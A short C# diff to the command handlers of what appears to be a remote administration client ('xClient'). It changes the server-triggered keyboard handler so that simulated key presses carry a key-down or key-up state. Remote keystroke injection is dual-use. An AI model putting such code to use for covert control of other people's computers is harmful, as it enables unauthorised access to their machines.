@@ -101,7 +101,7 @@ namespace xClient.Core.Commands
 
         public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
         {
-            NativeMethodsHelper.DoKeyPress(command.Key);
+            NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
         }
 
         public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
